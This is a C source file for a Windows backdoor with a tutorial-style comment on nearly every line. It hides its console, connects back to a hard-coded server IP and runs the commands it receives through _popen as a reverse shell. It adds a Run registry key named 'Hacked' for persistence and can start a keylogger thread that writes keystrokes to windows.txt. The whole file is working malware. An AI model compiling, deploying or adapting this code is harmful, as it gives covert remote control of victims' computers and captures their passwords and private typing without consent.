#include <stdio.h>
#include <stdlib.h>
//#include <unistd.h>
#include <WinSock2.h>
#include <Windows.h>
#include <WinUser.h>
#include <WinInet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p, size) (void) memset((p), 0, (size)) //clowning memset function to bzero

int sock;

//changing directory function
char *
str_cut(char str[], int slice_from, int slice_to)
{
    if(str[0] == '\0') return NULL;

    char* buffer;
    size_t str_len, buffer_len;

    if(slice_to < 0 && slice_from > slice_to)
    {
        str_len = strlen(str);

        if(abs(slice_to) > str_len - 1) return NULL;
        if(abs(slice_from) > str_len ) slice_from= (-1) * str_len;

        buffer_len= slice_to - slice_from;
        str += (str_len + slice_from);
    }
    else if (slice_from >= 0 && slice_to > slice_from) 
    {
        str_len= strlen(str);

        if(slice_from > str_len - 1) return NULL;

        buffer_len= slice_to - slice_from;
        str += slice_from;
    }
    else
    {
        return NULL;
    }

    buffer = calloc(buffer_len, sizeof(char));
    strncpy(buffer, str, buffer_len);
    return buffer;
}

//persistance function
int bootRun()
{
    char err[128]= "failed\n";
    char suc[128]= "Created Pesistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    TCHAR szPath[MAX_PATH]; //store path and get path to our own malware
    DWORD pathLen= 0;

     //retrives fully qualified path for the file that contains th specified module (we are geting the path to our malware)
    pathLen= GetModuleFileName(NULL, szPath, MAX_PATH);
    if(pathLen == 0)
    {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    HKEY NewVal;

  //OPENS SPECIFIED REGISTRY AND it will try to add the new value to it
    if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS)
    {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    DWORD pathLenInBytes= pathLen * sizeof(*szPath);

    if(RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS)
    {
        RegCloseKey(NewVal);
        send(sock, err,sizeof(err), 0);
        return -1;
    }

    RegCloseKey(NewVal);
    send(sock, suc, sizeof(suc), 0);
    return 0;
}

//keyloger function 
DWORD WINAPI logg()
{
    int vkey, last_key_state[0xFF];
    int isCAPSLOCK, isNUMLOCK;
    int isL_SHIFT, isR_SHIFT;
    int isPressed;
    char showKey;
    char NUMCHAR[]= ")!@#$%^&*(";
    char chars_vn[]=";=,-./`";
    char chars_vs[]= ":+<_>?~";
    char chars_va[]="[\\]\';";
    char chars_vb[]="{|}\"";

    FILE *kh;
    char KEY_LOG_FILE[]="windows.txt";
    //: making last key state 0
    for(vkey=0; vkey<0xFF; vkey++)
    {
        last_key_state[vkey]= 0;
    }

    //: running infinite
    while(1)
    {
        //: take rest for 10 ms
        Sleep(10);

        // get key state of CAPSLOCK, NUMCLOCK
        // and LEFT_SHIFT/ RIGHT_SHIFT
        isCAPSLOCK=(GetKeyState(0x14)&0xFF)>0?1:0;
        isNUMLOCK= (GetKeyState(0x90)&0xFF)>0?1:0;

        isL_SHIFT= (GetKeyState(0xA0)&0xFF00)>0?1:0;
        isR_SHIFT= (GetKeyState(0xA1)&0xFF00)>0?1:0;

        //checking state of all virtual keys
        for(vkey=0; vkey<0xFF; vkey++)
        {
            isPressed= (GetKeyState(vkey)&0xFF00)>0?1:0;
            showKey= (char)vkey;

            if(isPressed==1 && last_key_state[vkey]==0)
            {
                //for alphabets
                if(vkey>=0x41 && vkey<=0x5A)
                {
                    if(isCAPSLOCK==0)
                    {
                        if(isL_SHIFT==0 && isR_SHIFT==0)
                        {
                            showKey= (char)(vkey+0x20);
                        }
                    }
                    else if(isL_SHIFT==1 || isR_SHIFT==1)
                    {
                        showKey= (char)(vkey+0x20);
                    }
                }
                //for num characters
                else if(vkey>=0x30 && vkey<=0x39)
                {
                    if(isL_SHIFT==1 || isR_SHIFT==1)
                    {
                        showKey= NUMCHAR[vkey-0x30];
                    }
                }
                //for right side numpad
                else if(vkey>=0x60 && vkey<=0x69 && isNUMLOCK==1)
                {
                    showKey= (char)(vkey-0x30);
                }
                //for printable characters
                else if(vkey>=0xBA && vkey<=0xC0)
                {
                    if(isL_SHIFT==1 || isR_SHIFT==1)
                    {
                        showKey= chars_vs[vkey-0xBA];
                    }
                    else
                    {
                        showKey= chars_vn[vkey-0xBA];
                    }
                }
                else if(vkey>=0xDB && vkey<=0xDF)
                {
                    if(isL_SHIFT==1 || isR_SHIFT==1)
                    {
                        showKey=chars_vb[vkey-0xDB];
                    }
                    else
                    {
                        showKey= chars_va[vkey-0xDB];
                    }
                }
                //for right side chars ./*-+..
                //for chars like space, \n, enter etc..
                //for enter use newline char
                // dont print other keys
                else if(vkey==0x0D)
                {
                    showKey=(char)0x0A;
                }
                else if (vkey>=0x6A && vkey<=0x6F)
                {
                    showKey= (char)(vkey-0x40);
                }
                else if(vkey!=0x20 && vkey!=0x09)
                {
                    showKey=(char)0x00;
                }
                
                //print and save captured key
                if(showKey!=(char)0x00)
                {
                    kh= fopen(KEY_LOG_FILE, "a");
                    putc(showKey,kh);
                    fclose(kh);
                }
            }
            //save last state of key
            last_key_state[vkey]=isPressed;
        }   
    }
}


//shell function
// taking command from our server to client server (execution of commands) function
void Shell()
{
    char buffer[1024]; //for recieving commands from the server
    char container[1024];
    char total_response[18384];

    while(1)
    {
        jump:
        bzero(buffer, 1024); // converting the variable to 0s
        bzero(container,sizeof(container)); //size of acts same as defining the size in buffer(1024)
        bzero(total_response, sizeof(total_response));

        //make the program recive the commands from our server
        //buffer will store recieved bytes from sock, 1024 is the size of the variable
        recv(sock, buffer, 1024, 0);
        //our custom command lines
        if(strncmp("q", buffer, 1) == 0)
        {
            closesocket(sock); //close socket
            WSACleanup();
            exit(0);
        }
        //allowing changing directories
        else if(strncmp("cd ", buffer, 3) == 0)
        {
            chdir(str_cut(buffer, 3, 100));
        }
        //allowing persistance to the program, to auto start when pc is turned on
        else if(strncmp("persist", buffer, 7) == 0)
        {
           bootRun(); 
        }
        //activating keylogger
        else if(strncmp("keylog_start", buffer, 12)== 0)
        {
            //creating thread that will run keylog separately
            HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
            goto jump;
        }

        else
        {
            FILE *fp; //creating file descriptors
            fp= _popen(buffer,"r");//opening a file as a process. whatever is stored in this command will be run as a certain process or a task that the  system should execute,
            //buffer is where it will read the command, r stands for read, we are telling the program to read the command and execute it
            //fp line above, execute the command inside the buffer and stores it in fp , once we store the response inside the fp file descriptor 
            //we need to read from it and store the actual information inside the container bellow which is size of 1024 bytes that is why we use while loop  and then fgets()
            //we are getting 1024 bytes from the file descriptor inside the container variable 
                   
            while(fgets(container, 1024, fp) != NULL)  //fgets function gets string from another variable into a diffrent variable
            {
                strcat(total_response, container);
            }
            send(sock, total_response, sizeof(total_response), 0); //sending all the response
            fclose(fp);//closing the file descriptor
        }
    }
}
 

//--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
//hides terminal window    
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

//creating socket object that we will use to perform the connection to our server
    //defining two variables because we will need an ip adress and port to which we are going to connect to our backdoor
    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP; //will point a server IP   
    WSADATA wsaData; //wsdata is structure that contains information about windows sockets. we need it to have a socket connection to windows machine

    ServIP= "192.168.100.1" ; //here we type the ip of the machine that is going to listen for the incoming connection from our backdoor
    ServPort = 50005; //port that is not used by any other application

//checking for errors, if the function returns an interger that is not 0 we exit the program
    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0)
    {
        exit(1);
    }

//defining socket object
    sock= socket(AF_INET, SOCK_STREAM, 0); //AF_INET represents that we are establishing a connection over ipv4, SOCK_STREAM defines that we are going to use tcp connection/three way hanshake
    //defining all diffrent parameters for serAddr because it is a part of a structure stock adress
    memset(&ServAddr, 0, sizeof(ServAddr)); //clearing the variable with 0s>>set 0s to all content of servAddr(clearing it out of any bytes)
    ServAddr.sin_family= AF_INET;//ipv4 coonection
    ServAddr.sin_addr.s_addr = inet_addr(ServIP); // inet_addr converts string ip adress to an ip adress  format
    ServAddr.sin_port= htons(ServPort); // htons convert int port to port format

//performing connection to our server every 10 seconds to prevent the payload diying before a connection to our server 
    start:
    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)//check the vid for error here
    {
        Sleep(10);
        goto start;
    }
    Shell(); 
}







